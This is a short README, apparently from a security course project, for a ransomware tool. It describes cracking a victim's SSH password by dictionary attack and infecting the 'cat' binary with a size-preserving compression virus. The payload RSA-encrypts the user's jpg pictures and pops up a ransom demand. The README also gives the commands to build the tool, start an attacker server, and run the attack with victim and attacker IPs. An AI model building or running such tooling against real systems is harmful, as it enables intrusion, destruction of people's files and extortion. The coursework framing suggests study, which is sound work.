# Ransomware-Propagation-and-Payload

### Crack SSH password
- cracking the victim’s password by launching a dictionary attack

### Compression Virus with Ransomware Propagation
- infected ‘cat’ shall
- keep the same size as the original ‘cat’

### Ransomware Payload
- encrypting all picture files in jpg in /home/csc2023/Pictures using RSA
- popping up a window showing a message requesting ransom

### Run
compile
```
make
```
set up the attacker server
```
./attacker_server <Attacker port>
```
crack the victim’s password and infect ‘cat’ in /home/csc2023/
```
./crack_attack <Victim IP> <Attacker IP> <Attacker port>
```
